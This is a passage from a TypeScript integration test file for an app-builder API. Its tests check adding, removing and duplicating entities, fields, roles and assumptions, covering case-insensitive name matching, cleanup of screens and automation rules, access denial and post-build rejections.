 * own real-cased name (not the request's lowercase spelling) is what
 * ends up removed from spec.entities/spec.screens and passed to
 * disableAutomationRulesForEntity.
 */
test("removing an entity still succeeds, and cleans up its own screens and automation rules, when the URL's own entityName differs from the entity's real name only by letter case", async () => {
  await withServer(async (baseUrl, db) => {
    const email = `entity-remove-case-${randomUUID()}@example.com`;
    const token = await signup(baseUrl, email);
    const user = findUserByEmail(db, email)!;
    const spec: ProductSpec = {
      summary: "test",
      personas: [],
      roles: ["Admin"],
      entities: [
        { name: "Customer", fields: [{ name: "fullName", type: "text", required: true }] },
        { name: "Deal", fields: [{ name: "title", type: "text", required: true }] },
      ],
      screens: [
        { name: "Deal List", type: "list", entity: "Deal" },
        { name: "Customer List", type: "list", entity: "Customer" },
      ],
      assumptions: [],
      openQuestions: [],
    };
    const projectId = randomUUID();
    insertProject(db, { id: projectId, ownerId: user.id, name: "CRM", description: "test", spec });
    insertAutomationRule(db, {
      projectId,
      entityName: "Deal",
      trigger: "field_equals",
      fieldName: "title",
      fieldValue: "x",
      actionType: "send_whatsapp",
      toMode: "field",
      toField: "title",
      messageTemplate: "hi",
    });

    // The URL spells the entity in lowercase -- its real declared name is
    // "Deal".
    const res = await fetch(`${baseUrl}/api/projects/${projectId}/entities/deal`, {
      method: "DELETE",
      headers: authHeaders(token),
    });
    assert.equal(res.status, 200, "deletion must still succeed even though the URL's entityName differs from the entity's real name only by letter case");
    const { project: updated } = (await res.json()) as {
      project: { spec: { entities: { name: string }[]; screens: { name: string; entity?: string }[] } };
    };
    assert.deepEqual(updated.spec.entities.map((e) => e.name), ["Customer"], "the real Deal entity must have been removed, not left behind");
    assert.ok(!updated.spec.screens.some((s) => s.entity === "Deal"), "Deal's own screens must be cleaned up, keyed by the entity's real name");
    assert.ok(updated.spec.screens.some((s) => s.entity === "Customer"), "the surviving entity's own screens must be untouched");

    const rulesRes = await fetch(`${baseUrl}/api/projects/${projectId}/automations`, { headers: authHeaders(token) });
    const { rules } = (await rulesRes.json()) as { rules: { enabled: boolean }[] };
    assert.equal(rules.length, 1, "sanity check: the automation rule on the removed entity must still exist, just disabled");
    assert.equal(rules[0]!.enabled, false, "the automation rule on the removed Deal entity must have been disabled, not left dangling and enabled");
  });
});

/**
 * Round 1187: findField (unlike findEntity, fixed round 1162) never got its
 * own case-insensitive fallback, so every field-level route resolving
 * :fieldName through it -- PATCH label/required/type, the upload routes,
 * automation-rule field validation -- threw a false 404 when the URL's own
 * fieldName differed from the field's real declared name only by letter
 * case. Proven here via the label-rename route, one of the sites that
 * already correctly captures and reuses findField's resolved field object.
 */
test("PATCH .../fields/:fieldName/label still resolves the field when the URL's own fieldName differs from the field's real name only by letter case", async () => {
  await withServer(async (baseUrl, db) => {
    const email = `field-case-label-${randomUUID()}@example.com`;
    const token = await signup(baseUrl, email);
    const user = findUserByEmail(db, email)!;
    const spec: ProductSpec = {
      summary: "test",
      personas: [],
      roles: ["Admin"],
      entities: [{ name: "Deal", fields: [{ name: "dealStatus", type: "text", required: true }, { name: "title", type: "text", required: true }] }],
      screens: [{ name: "Deal List", type: "list", entity: "Deal" }],
      assumptions: [],
      openQuestions: [],
    };
    const projectId = randomUUID();
    insertProject(db, { id: projectId, ownerId: user.id, name: "CRM", description: "test", spec });

    // The URL spells the field in lowercase -- its real declared name is
    // "dealStatus".
    const res = await fetch(`${baseUrl}/api/projects/${projectId}/entities/Deal/fields/dealstatus/label`, {
      method: "PATCH",
      headers: authHeaders(token),
      body: JSON.stringify({ label: "Status" }),
    });
    assert.equal(res.status, 200, "the label rename must still succeed even though the URL's fieldName differs from the field's real name only by letter case");
    const { project: updated } = (await res.json()) as { project: { spec: { entities: { fields: { name: string; label?: string }[] }[] } } };
    const renamed = updated.spec.entities[0]!.fields.find((f) => f.name === "dealStatus");
    assert.equal(renamed?.label, "Status", "the real dealStatus field must have received the new label");
  });
});

/**
 * Round 1187: the DELETE field route itself has a second, subtler gap on
 * top of findField's own missing fallback -- it called findField purely
 * for its 404 side-effect (discarding the resolved field) while its actual
 * removal filter and disableAutomationRulesForField call both kept using
 * the raw, unresolved req.params.fieldName. Fixing findField's fallback
 * alone would have let this exact request through the existence check,
 * only for the removal filter and the disable call to match nothing
 * against the raw lowercase param -- turning the previous false-404 into a
 * worse false-200: the field left in place, and a referencing automation
 * rule left dangling and enabled, despite a reported success. This test
 * asserts the field is actually gone and the rule is actually disabled,
 * not just that the response is 200.
 */
test("DELETE .../fields/:fieldName actually removes the field and disables a referencing automation rule when the URL's own fieldName differs from the field's real name only by letter case", async () => {
  await withServer(async (baseUrl, db) => {
    const email = `field-case-delete-${randomUUID()}@example.com`;
    const token = await signup(baseUrl, email);
    const user = findUserByEmail(db, email)!;
    const spec: ProductSpec = {
      summary: "test",
      personas: [],
      roles: ["Admin"],
      entities: [{ name: "Deal", fields: [{ name: "dealStatus", type: "text", required: true }, { name: "title", type: "text", required: true }] }],
      screens: [{ name: "Deal List", type: "list", entity: "Deal" }],
      assumptions: [],
      openQuestions: [],
    };
    const projectId = randomUUID();
    insertProject(db, { id: projectId, ownerId: user.id, name: "CRM", description: "test", spec });
    insertAutomationRule(db, {
      projectId,
      entityName: "Deal",
      trigger: "field_equals",
      fieldName: "dealStatus",
      fieldValue: "closed",
      actionType: "send_whatsapp",
      toMode: "field",
      toField: "title",
      messageTemplate: "hi",
    });

    // The URL spells the field in lowercase -- its real declared name is
    // "dealStatus".
    const res = await fetch(`${baseUrl}/api/projects/${projectId}/entities/Deal/fields/dealstatus`, {
      method: "DELETE",
      headers: authHeaders(token),
    });
    assert.equal(res.status, 200, "deletion must still succeed even though the URL's fieldName differs from the field's real name only by letter case");
    const { project: updated } = (await res.json()) as { project: { spec: { entities: { fields: { name: string }[] }[] } } };
    assert.deepEqual(
      updated.spec.entities[0]!.fields.map((f) => f.name),
      ["title"],
      "the real dealStatus field must have been removed, not left behind despite the 200",
    );

    const rulesRes = await fetch(`${baseUrl}/api/projects/${projectId}/automations`, { headers: authHeaders(token) });
    const { rules } = (await rulesRes.json()) as { rules: { enabled: boolean }[] };
    assert.equal(rules.length, 1, "sanity check: the automation rule on the removed field must still exist, just disabled");
    assert.equal(rules[0]!.enabled, false, "the automation rule referencing the removed dealStatus field must have been disabled, not left dangling and enabled");
  });
});

/**
 * Round 553: this route used to leave `spec.screens` completely untouched,
 * so a removed entity's own screen entries (e.g. "Deal List"/"Deal Form")
 * stayed in the spec forever, dangling and naming an entity that no longer
 * exists -- baked permanently into the project's initial-build checkpoint,
 * since /build passes spec.screens straight through with no regeneration.
 */
test("removing an entity also removes its own screens, instead of leaving dangling entries naming a deleted entity (round 553)", async () => {
  await withServer(async (baseUrl) => {
    const token = await signup(baseUrl, "entity-remove-screens@example.com");
    const createRes = await fetch(`${baseUrl}/api/projects`, {
      method: "POST",
      headers: authHeaders(token),
      body: JSON.stringify({ description: "A CRM with customers and deals." }),
    });
    const { project } = (await createRes.json()) as {
      project: { id: string; spec: { entities: { name: string }[]; screens: { name: string; entity?: string }[] } };
    };
    assert.deepEqual(project.spec.entities.map((e) => e.name), ["Customer", "Deal"]);
    assert.ok(project.spec.screens.some((s) => s.entity === "Deal"), "the fixture project must actually have Deal-tagged screens to remove");

    const res = await fetch(`${baseUrl}/api/projects/${project.id}/entities/Deal`, {
      method: "DELETE",
      headers: authHeaders(token),
    });
    assert.equal(res.status, 200);
    const { project: updated } = (await res.json()) as {
      project: { spec: { entities: { name: string }[]; screens: { name: string; entity?: string }[] } };
    };
    assert.deepEqual(updated.spec.entities.map((e) => e.name), ["Customer"]);
    assert.ok(!updated.spec.screens.some((s) => s.entity === "Deal"), "no screen should still reference the deleted Deal entity");
    assert.ok(updated.spec.screens.some((s) => s.entity === "Customer"), "the surviving entity's own screens must be untouched");
  });
});

test("removing an entity on a project you have no access to still 404s, the same as any other project route", async () => {
  await withServer(async (baseUrl) => {
    const ownerToken = await signup(baseUrl, "entity-remove-owner3@example.com");
    const outsiderToken = await signup(baseUrl, "entity-remove-outsider3@example.com");
    const createRes = await fetch(`${baseUrl}/api/projects`, {
      method: "POST",
      headers: authHeaders(ownerToken),
      body: JSON.stringify({ description: "A CRM with customers and deals." }),
    });
    const { project } = (await createRes.json()) as { project: { id: string; spec: { entities: { name: string }[] } } };

    const res = await fetch(`${baseUrl}/api/projects/${project.id}/entities/${project.spec.entities[0].name}`, {
      method: "DELETE",
      headers: authHeaders(outsiderToken),
    });
    assert.equal(res.status, 404);
  });
});

test("removing an entity from a project that's already been built is rejected with ENTITY_REMOVAL_AFTER_BUILD, since the real database table and generated code for it already exist", async () => {
  await withServer(async (baseUrl) => {
    const token = await signup(baseUrl, "entity-remove-afterbuild@example.com");
    const createRes = await fetch(`${baseUrl}/api/projects`, {
      method: "POST",
      headers: authHeaders(token),
      body: JSON.stringify({ description: "A CRM with customers and deals." }),
    });
    const { project } = (await createRes.json()) as { project: { id: string; spec: { entities: { name: string }[] } } };

    const buildRes = await fetch(`${baseUrl}/api/projects/${project.id}/build`, {
      method: "POST",
      headers: authHeaders(token),
    });
    await collectSSE(buildRes);

    const res = await fetch(`${baseUrl}/api/projects/${project.id}/entities/${project.spec.entities[0].name}`, {
      method: "DELETE",
      headers: authHeaders(token),
    });
    assert.equal(res.status, 409);
    assert.equal(((await res.json()) as { code?: string }).code, "ENTITY_REMOVAL_AFTER_BUILD");
  });
});

test("the owner can add a role, and a collaborator can too -- both are appended to the end, keeping existing roles in order", async () => {
  await withServer(async (baseUrl) => {
    const ownerToken = await signup(baseUrl, "role-add-owner1@example.com");
    const collabToken = await signup(baseUrl, "role-add-collab1@example.com");
    const createRes = await fetch(`${baseUrl}/api/projects`, {
      method: "POST",
      headers: authHeaders(ownerToken),
      body: JSON.stringify({ description: "A CRM with customers and deals." }),
    });
    const { project } = (await createRes.json()) as { project: { id: string; spec: { roles: string[] } } };
    const originalRoles = project.spec.roles;
    await fetch(`${baseUrl}/api/projects/${project.id}/collaborators`, {
      method: "POST",
      headers: authHeaders(ownerToken),
      body: JSON.stringify({ email: "role-add-collab1@example.com" }),
    });

    const ownerRes = await fetch(`${baseUrl}/api/projects/${project.id}/roles`, {
      method: "POST",
      headers: authHeaders(ownerToken),
      body: JSON.stringify({ role: "Warehouse Manager" }),
    });
    assert.equal(ownerRes.status, 200);
    const { project: afterFirstAdd } = (await ownerRes.json()) as { project: { spec: { roles: string[] } } };
    assert.deepEqual(afterFirstAdd.spec.roles, [...originalRoles, "Warehouse Manager"]);

    const collabRes = await fetch(`${baseUrl}/api/projects/${project.id}/roles`, {
      method: "POST",
      headers: authHeaders(collabToken),
      body: JSON.stringify({ role: "  Auditor  " }),
    });
    assert.equal(collabRes.status, 200);
    const { project: afterSecondAdd } = (await collabRes.json()) as { project: { spec: { roles: string[] } } };
    assert.deepEqual(
      afterSecondAdd.spec.roles,
      [...originalRoles, "Warehouse Manager", "Auditor"],
      "a collaborator can add a role too, and the value is trimmed",
    );
  });
});

test("adding a blank/whitespace-only role is rejected with 400 instead of appending an empty string", async () => {
  await withServer(async (baseUrl) => {
    const token = await signup(baseUrl, "role-add-blank@example.com");
    const createRes = await fetch(`${baseUrl}/api/projects`, {
      method: "POST",
      headers: authHeaders(token),
      body: JSON.stringify({ description: "A CRM with customers and deals." }),
    });
    const { project } = (await createRes.json()) as { project: { id: string; spec: { roles: string[] } } };

    const res = await fetch(`${baseUrl}/api/projects/${project.id}/roles`, {
      method: "POST",
      headers: authHeaders(token),
      body: JSON.stringify({ role: "   " }),
    });
    assert.equal(res.status, 400);
    assert.equal(((await res.json()) as { code?: string }).code, "VALIDATION_ERROR");

    const getRes = await fetch(`${baseUrl}/api/projects/${project.id}`, { headers: authHeaders(token) });
    const { project: unchanged } = (await getRes.json()) as { project: { spec: { roles: string[] } } };
    assert.deepEqual(unchanged.spec.roles, project.spec.roles);
  });
});

test("adding a role on a project you have no access to still 404s, the same as any other project route", async () => {
  await withServer(async (baseUrl) => {
    const ownerToken = await signup(baseUrl, "role-add-owner2@example.com");
    const outsiderToken = await signup(baseUrl, "role-add-outsider2@example.com");
    const createRes = await fetch(`${baseUrl}/api/projects`, {
      method: "POST",
      headers: authHeaders(ownerToken),
      body: JSON.stringify({ description: "A CRM with customers and deals." }),
    });
    const { project } = (await createRes.json()) as { project: { id: string } };

    const res = await fetch(`${baseUrl}/api/projects/${project.id}/roles`, {
      method: "POST",
      headers: authHeaders(outsiderToken),
      body: JSON.stringify({ role: "Should not be added" }),
    });
    assert.equal(res.status, 404);
  });
});

test("the owner can add an assumption, and a collaborator can too -- both are appended to the end, keeping existing assumptions in order", async () => {
  await withServer(async (baseUrl) => {
    const ownerToken = await signup(baseUrl, "assumption-add-owner1@example.com");
    const collabToken = await signup(baseUrl, "assumption-add-collab1@example.com");
    const createRes = await fetch(`${baseUrl}/api/projects`, {
      method: "POST",
      headers: authHeaders(ownerToken),
      body: JSON.stringify({ description: "A CRM with customers and deals." }),
    });
    const { project } = (await createRes.json()) as { project: { id: string; spec: { assumptions: string[] } } };
    const originalAssumptions = project.spec.assumptions;
    await fetch(`${baseUrl}/api/projects/${project.id}/collaborators`, {
      method: "POST",
      headers: authHeaders(ownerToken),
      body: JSON.stringify({ email: "assumption-add-collab1@example.com" }),
    });

    const ownerRes = await fetch(`${baseUrl}/api/projects/${project.id}/assumptions`, {
      method: "POST",
      headers: authHeaders(ownerToken),
      body: JSON.stringify({ assumption: "Payments are handled outside the app" }),
    });
    assert.equal(ownerRes.status, 200);
    const { project: afterFirstAdd } = (await ownerRes.json()) as { project: { spec: { assumptions: string[] } } };
    assert.deepEqual(afterFirstAdd.spec.assumptions, [...originalAssumptions, "Payments are handled outside the app"]);

    const collabRes = await fetch(`${baseUrl}/api/projects/${project.id}/assumptions`, {
      method: "POST",
      headers: authHeaders(collabToken),
      body: JSON.stringify({ assumption: "  Only one warehouse location  " }),
    });
    assert.equal(collabRes.status, 200);
    const { project: afterSecondAdd } = (await collabRes.json()) as { project: { spec: { assumptions: string[] } } };
    assert.deepEqual(
      afterSecondAdd.spec.assumptions,
      [...originalAssumptions, "Payments are handled outside the app", "Only one warehouse location"],
      "a collaborator can add an assumption too, and the value is trimmed",
    );
  });
});

test("the owner can add an entity, and a collaborator can too -- each gets a derived name, the typed text as its label, and one required starter field", async () => {
  await withServer(async (baseUrl) => {
    const ownerToken = await signup(baseUrl, "entity-add-owner1@example.com");
    const collabToken = await signup(baseUrl, "entity-add-collab1@example.com");
    const createRes = await fetch(`${baseUrl}/api/projects`, {
      method: "POST",
      headers: authHeaders(ownerToken),
      body: JSON.stringify({ description: "A CRM with customers and deals." }),
    });
    const { project } = (await createRes.json()) as { project: { id: string; spec: { entities: { name: string }[] } } };
    const originalEntityCount = project.spec.entities.length;
    await fetch(`${baseUrl}/api/projects/${project.id}/collaborators`, {
      method: "POST",
      headers: authHeaders(ownerToken),
      body: JSON.stringify({ email: "entity-add-collab1@example.com" }),
    });

    const ownerRes = await fetch(`${baseUrl}/api/projects/${project.id}/entities`, {
      method: "POST",
      headers: authHeaders(ownerToken),
      body: JSON.stringify({ label: "  Loyalty Program  " }),
    });
    assert.equal(ownerRes.status, 200);
    const { project: afterFirstAdd } = (await ownerRes.json()) as {
      project: { spec: { entities: { name: string; label?: string; fields: { name: string; type: string; required: boolean }[] }[] } };
    };
    const added = afterFirstAdd.spec.entities[originalEntityCount];
    assert.equal(added.name, "LoyaltyProgram", "the label is turned into a valid ASCII table-name identifier");
    assert.equal(added.label, "Loyalty Program", "the trimmed, un-transformed typed text is kept as the human-facing label");
    assert.deepEqual(added.fields, [{ name: "name", type: "text", required: true }]);

    const collabRes = await fetch(`${baseUrl}/api/projects/${project.id}/entities`, {
      method: "POST",
      headers: authHeaders(collabToken),
      body: JSON.stringify({ label: "Warehouse" }),
    });
    assert.equal(collabRes.status, 200);
    const { project: afterSecondAdd } = (await collabRes.json()) as { project: { spec: { entities: { name: string }[] } } };
    assert.equal(
      afterSecondAdd.spec.entities.length,
      originalEntityCount + 2,
      "a collaborator can add an entity too",
    );
  });
});

test("adding an entity whose derived name collides (case-insensitively) with an existing one gets a numeric suffix instead of erroring", async () => {
  await withServer(async (baseUrl) => {
    const token = await signup(baseUrl, "entity-add-collision@example.com");
    const createRes = await fetch(`${baseUrl}/api/projects`, {
      method: "POST",
      headers: authHeaders(token),
      body: JSON.stringify({ description: "A CRM with customers and deals." }),
    });
    const { project } = (await createRes.json()) as { project: { id: string; spec: { entities: { name: string }[] } } };
    const existingName = project.spec.entities[0].name;

    const res = await fetch(`${baseUrl}/api/projects/${project.id}/entities`, {
      method: "POST",
      headers: authHeaders(token),
      body: JSON.stringify({ label: existingName.toLowerCase() }),
    });
    assert.equal(res.status, 200);
    const { project: updated } = (await res.json()) as { project: { spec: { entities: { name: string }[] } } };
    assert.equal(updated.spec.entities.at(-1)!.name, `${existingName}2`);
  });
});

test("adding a blank/whitespace-only entity label is rejected with 400 instead of appending an invalid entity", async () => {
  await withServer(async (baseUrl) => {
    const token = await signup(baseUrl, "entity-add-blank@example.com");
    const createRes = await fetch(`${baseUrl}/api/projects`, {
      method: "POST",
      headers: authHeaders(token),
      body: JSON.stringify({ description: "A CRM with customers and deals." }),
    });
    const { project } = (await createRes.json()) as { project: { id: string; spec: { entities: { name: string }[] } } };

    const res = await fetch(`${baseUrl}/api/projects/${project.id}/entities`, {
      method: "POST",
      headers: authHeaders(token),
      body: JSON.stringify({ label: "   " }),
    });
    assert.equal(res.status, 400);
    assert.equal(((await res.json()) as { code?: string }).code, "VALIDATION_ERROR");

    const getRes = await fetch(`${baseUrl}/api/projects/${project.id}`, { headers: authHeaders(token) });
    const { project: unchanged } = (await getRes.json()) as { project: { spec: { entities: { name: string }[] } } };
    assert.deepEqual(unchanged.spec.entities, project.spec.entities);
  });
});

/**
 * Round 553: this route used to leave `spec.screens` completely untouched,
 * so a manually-added entity got zero screens of its own -- permanently
 * undercounting the "N screens" HistoryPanel.tsx/checkpointDiff.ts show for
 * that project's initial-build checkpoint, since /build passes spec.screens
 * straight through with no regeneration.
 */
test("adding an entity also adds screens for it, mirroring the project's existing per-entity screen shape (round 553)", async () => {
  await withServer(async (baseUrl) => {
    const token = await signup(baseUrl, "entity-add-screens@example.com");
    const createRes = await fetch(`${baseUrl}/api/projects`, {
      method: "POST",
      headers: authHeaders(token),
      body: JSON.stringify({ description: "A CRM with customers and deals." }),
    });
    const { project } = (await createRes.json()) as {
      project: { id: string; spec: { entities: { name: string }[]; screens: { name: string; type: string; entity?: string }[] } };
    };
    assert.deepEqual(project.spec.entities.map((e) => e.name), ["Customer", "Deal"]);
    const dealScreens = project.spec.screens.filter((s) => s.entity === "Deal");
    assert.equal(dealScreens.length, 2, "heuristic.ts gives every entity its own List and Form screen");

    const addRes = await fetch(`${baseUrl}/api/projects/${project.id}/entities`, {
      method: "POST",
      headers: authHeaders(token),
      body: JSON.stringify({ label: "Invoice" }),
    });
    assert.equal(addRes.status, 200);
    const { project: updated } = (await addRes.json()) as {
      project: { spec: { entities: { name: string }[]; screens: { name: string; type: string; entity?: string }[] } };
    };
    assert.deepEqual(updated.spec.entities.map((e) => e.name), ["Customer", "Deal", "Invoice"]);

    const invoiceScreens = updated.spec.screens.filter((s) => s.entity === "Invoice");
    assert.deepEqual(
      invoiceScreens.map((s) => ({ name: s.name, type: s.type })),
      [
        { name: "Invoice List", type: "list" },
        { name: "Invoice Form", type: "form" },
      ],
      "the new entity's screens must mirror the existing Deal List/Deal Form shape, not be left out entirely",
    );
  });
});

/**
 * Round 555: deriveEntityName had no guard against a numeral-led label --
 * "2024 Sales" joined to "2024Sales", which passes EntitySchema and builds
 * fine in the live preview (tableNameFor's permanent "entity_" prefix hides
 * the leading digit there), but codegen.ts's exported-app generator uses
 * entity.name directly with no such prefix, so assertSafe always rejected
 * it with EXPORT_UNSAFE_IDENTIFIER the moment an otherwise-healthy project
 * was exported. This is the same symptom as the non-ASCII-entity-name test
 * above, but reached through the ordinary "Add Entity" UI with a plain
 * English numeral-led label, not an AI-provided non-ASCII name.
 */
test("adding an entity with a numeral-led label still exports cleanly (round 555)", async () => {
  await withServer(async (baseUrl) => {
    const token = await signup(baseUrl, "entity-add-numeral@example.com");
    const createRes = await fetch(`${baseUrl}/api/projects`, {
      method: "POST",
      headers: authHeaders(token),
      body: JSON.stringify({ description: "A CRM with customers and deals." }),
    });
    const { project } = (await createRes.json()) as { project: { id: string } };

    const addRes = await fetch(`${baseUrl}/api/projects/${project.id}/entities`, {
      method: "POST",
      headers: authHeaders(token),
      body: JSON.stringify({ label: "2024 Sales" }),
    });
    assert.equal(addRes.status, 200);
    const { project: updated } = (await addRes.json()) as { project: { spec: { entities: { name: string }[] } } };
    assert.ok(
      updated.spec.entities.some((e) => e.name === "Entity2024Sales"),
      "the derived entity name must not start with a digit",
    );

    const buildRes = await fetch(`${baseUrl}/api/projects/${project.id}/build`, {
      method: "POST",
      headers: authHeaders(token),
    });
    const events = await collectSSE(buildRes);
    const forge = events.find((e) => e.agent === "Forge");
    assert.equal(forge?.status, "success");

    const exportRes = await fetch(`${baseUrl}/api/projects/${project.id}/export`, { headers: authHeaders(token) });
    assert.equal(exportRes.status, 200, "exporting a numeral-led entity name must no longer throw EXPORT_UNSAFE_IDENTIFIER");
  });
});

test("adding an entity on a project you have no access to still 404s, the same as any other project route", async () => {
  await withServer(async (baseUrl) => {
    const ownerToken = await signup(baseUrl, "entity-add-owner2@example.com");
    const outsiderToken = await signup(baseUrl, "entity-add-outsider2@example.com");
    const createRes = await fetch(`${baseUrl}/api/projects`, {
      method: "POST",
      headers: authHeaders(ownerToken),
      body: JSON.stringify({ description: "A CRM with customers and deals." }),
    });
    const { project } = (await createRes.json()) as { project: { id: string } };

    const res = await fetch(`${baseUrl}/api/projects/${project.id}/entities`, {
      method: "POST",
      headers: authHeaders(outsiderToken),
      body: JSON.stringify({ label: "Should not be added" }),
    });
    assert.equal(res.status, 404);
  });
});

test("duplicating an entity clones its whole field list into a new entity with a derived, uniquely-suffixed name and a \" (copy)\" label", async () => {
  await withServer(async (baseUrl) => {
    const token = await signup(baseUrl, "entity-duplicate1@example.com");
    const createRes = await fetch(`${baseUrl}/api/projects`, {
      method: "POST",
      headers: authHeaders(token),
      body: JSON.stringify({ description: "A CRM with customers and deals." }),
    });
    const { project } = (await createRes.json()) as {
      project: { id: string; spec: { entities: { name: string; label?: string; fields: { name: string; type: string }[] }[] } };
    };
    const source = project.spec.entities[0];

    const res = await fetch(`${baseUrl}/api/projects/${project.id}/entities/${source.name}/duplicate`, {
      method: "POST",
      headers: authHeaders(token),
    });
    assert.equal(res.status, 200);
    const { project: updated } = (await res.json()) as {
      project: { spec: { entities: { name: string; label?: string; fields: { name: string; type: string }[] }[] } };
    };
    assert.equal(updated.spec.entities.length, project.spec.entities.length + 1, "must append exactly one new entity");
    const clone = updated.spec.entities.at(-1)!;
    assert.notEqual(clone.name, source.name, "the clone must get its own, distinct table name");
    assert.equal(clone.label, `${source.label ?? source.name} (copy)`, "the clone's label must be the source's own label/name with a \" (copy)\" suffix, matching /projects/:id/clone's own convention");
    assert.deepEqual(clone.fields, source.fields, "every field (name, type, required, enumValues, relationTo, etc.) must be copied verbatim");
  });
});

test("duplicating an entity twice in a row gets two distinct names (no collision), the second time deriving from the same original source label", async () => {
  await withServer(async (baseUrl) => {
    const token = await signup(baseUrl, "entity-duplicate2@example.com");
    const createRes = await fetch(`${baseUrl}/api/projects`, {
      method: "POST",
      headers: authHeaders(token),
      body: JSON.stringify({ description: "A CRM with customers and deals." }),
    });
    const { project } = (await createRes.json()) as { project: { id: string; spec: { entities: { name: string }[] } } };
    const source = project.spec.entities[0];

    const firstRes = await fetch(`${baseUrl}/api/projects/${project.id}/entities/${source.name}/duplicate`, {
      method: "POST",
      headers: authHeaders(token),
    });
    const { project: afterFirst } = (await firstRes.json()) as { project: { spec: { entities: { name: string }[] } } };

    const secondRes = await fetch(`${baseUrl}/api/projects/${project.id}/entities/${source.name}/duplicate`, {
      method: "POST",
      headers: authHeaders(token),
    });
    assert.equal(secondRes.status, 200);
    const { project: afterSecond } = (await secondRes.json()) as { project: { spec: { entities: { name: string }[] } } };
    assert.equal(afterSecond.spec.entities.length, afterFirst.spec.entities.length + 1);
    const names = afterSecond.spec.entities.map((e) => e.name);
    assert.equal(new Set(names).size, names.length, "every entity name must still be unique after duplicating the same source twice");
  });
});

test("duplicating an entity to a project that's already been built is rejected with ENTITY_DUPLICATE_AFTER_BUILD, since the real database table and generated code would never reflect it", async () => {
  await withServer(async (baseUrl) => {
    const token = await signup(baseUrl, "entity-duplicate-afterbuild@example.com");
    const createRes = await fetch(`${baseUrl}/api/projects`, {
      method: "POST",
      headers: authHeaders(token),
      body: JSON.stringify({ description: "A CRM with customers and deals." }),
    });
    const { project } = (await createRes.json()) as { project: { id: string; spec: { entities: { name: string }[] } } };
    const source = project.spec.entities[0];

    const buildRes = await fetch(`${baseUrl}/api/projects/${project.id}/build`, {
      method: "POST",
      headers: authHeaders(token),
    });
    await collectSSE(buildRes);

    const res = await fetch(`${baseUrl}/api/projects/${project.id}/entities/${source.name}/duplicate`, {
      method: "POST",
      headers: authHeaders(token),
    });
    assert.equal(res.status, 409);
    assert.equal(((await res.json()) as { code?: string }).code, "ENTITY_DUPLICATE_AFTER_BUILD");
  });
});

test("POST /projects/:id/entities/:entityName/duplicate retried with the same idempotency key after the first attempt already finished replays the original response instead of duplicating twice", async () => {
  await withServer(async (baseUrl) => {
    const token = await signup(baseUrl, "entity-duplicate-idem1@example.com");
    const createRes = await fetch(`${baseUrl}/api/projects`, {
      method: "POST",
      headers: authHeaders(token),
      body: JSON.stringify({ description: "A CRM with customers and deals." }),
    });
    const { project } = (await createRes.json()) as { project: { id: string; spec: { entities: { name: string }[] } } };
    const source = project.spec.entities[0];
    const originalCount = project.spec.entities.length;

    const headers = { ...authHeaders(token), "x-idempotency-key": "entity-duplicate-repro-key" };
    const firstRes = await fetch(`${baseUrl}/api/projects/${project.id}/entities/${source.name}/duplicate`, {
      method: "POST",
      headers,
    });
    assert.equal(firstRes.status, 200);
    const first = (await firstRes.json()) as { project: { spec: { entities: { name: string }[] } } };
    assert.equal(first.project.spec.entities.length, originalCount + 1);

    const retryRes = await fetch(`${baseUrl}/api/projects/${project.id}/entities/${source.name}/duplicate`, {
      method: "POST",
      headers,
    });
    assert.equal(retryRes.status, 200);
    const retry = (await retryRes.json()) as { project: { spec: { entities: { name: string }[] } } };
    assert.deepEqual(
      retry.project.spec.entities,
      first.project.spec.entities,
      "the retry must replay the original response, not duplicate the entity a second time",
    );
  });
});

test("adding an entity to a project that's already been built is rejected with ENTITY_ADD_AFTER_BUILD, since the real database table and generated code would never reflect it", async () => {
  await withServer(async (baseUrl) => {
    const token = await signup(baseUrl, "entity-add-afterbuild@example.com");
    const createRes = await fetch(`${baseUrl}/api/projects`, {
      method: "POST",
      headers: authHeaders(token),
      body: JSON.stringify({ description: "A CRM with customers and deals." }),
    });
    const { project } = (await createRes.json()) as { project: { id: string } };

    const buildRes = await fetch(`${baseUrl}/api/projects/${project.id}/build`, {
      method: "POST",
      headers: authHeaders(token),
    });
    await collectSSE(buildRes);

    const res = await fetch(`${baseUrl}/api/projects/${project.id}/entities`, {
      method: "POST",
      headers: authHeaders(token),
      body: JSON.stringify({ label: "Payment" }),
    });
    assert.equal(res.status, 409);
    assert.equal(((await res.json()) as { code?: string }).code, "ENTITY_ADD_AFTER_BUILD");
  });
});

test("adding a field to an entity appends it with a derived camelCase name, as a plain optional text field", async () => {
  await withServer(async (baseUrl) => {
    const token = await signup(baseUrl, "field-add-owner1@example.com");
    const createRes = await fetch(`${baseUrl}/api/projects`, {
      method: "POST",
      headers: authHeaders(token),
      body: JSON.stringify({ description: "A CRM with customers and deals." }),
    });
    const { project } = (await createRes.json()) as {
      project: { id: string; spec: { entities: { name: string; fields: { name: string }[] }[] } };
    };
    const entityName = project.spec.entities[0].name;
    const originalFieldCount = project.spec.entities[0].fields.length;

    const res = await fetch(`${baseUrl}/api/projects/${project.id}/entities/${entityName}/fields`, {
      method: "POST",
      headers: authHeaders(token),
      body: JSON.stringify({ label: "Phone Number" }),
    });
    assert.equal(res.status, 200);
    const { project: updated } = (await res.json()) as {
      project: { spec: { entities: { name: string; fields: { name: string; label?: string; type: string; required: boolean }[] }[] } };
    };
    const updatedEntity = updated.spec.entities.find((e) => e.name === entityName)!;
    assert.equal(updatedEntity.fields.length, originalFieldCount + 1);
    const newField = updatedEntity.fields.at(-1)!;
    assert.equal(newField.name, "phoneNumber", "the label must derive a camelCase ASCII name, matching deriveFieldName");
    assert.equal(newField.label, "Phone Number");
    assert.equal(newField.type, "text");
    assert.equal(newField.required, false);

    // Adding to the entity a collaborator can also access is the same combined-access
    // story every other add/remove route in this file already exercises via requireProjectAccess.
    const otherEntities = updated.spec.entities.filter((e) => e.name !== entityName);
    assert.deepEqual(otherEntities.map((e) => e.fields.length), project.spec.entities.filter((e) => e.name !== entityName).map((e) => e.fields.length));
  });
});

/**
 * Real feature round: the spec-review screen's add-field form could
 * previously only ever create a plain optional text field -- the one
 * thing on that screen you could never actually fix without deleting and
 * recreating the field, since re-adding it just produced the same plain
 * text field again. type/required/enumValues now all round-trip exactly
 * as a direct POST without going through AddFieldSchema.default would.
 */
test("adding a field can specify type, required, and (for enum) enumValues directly, instead of always landing as a plain optional text field", async () => {
  await withServer(async (baseUrl) => {
    const token = await signup(baseUrl, "field-add-type1@example.com");
    const createRes = await fetch(`${baseUrl}/api/projects`, {
      method: "POST",
      headers: authHeaders(token),
      body: JSON.stringify({ description: "A CRM with customers and deals." }),
    });
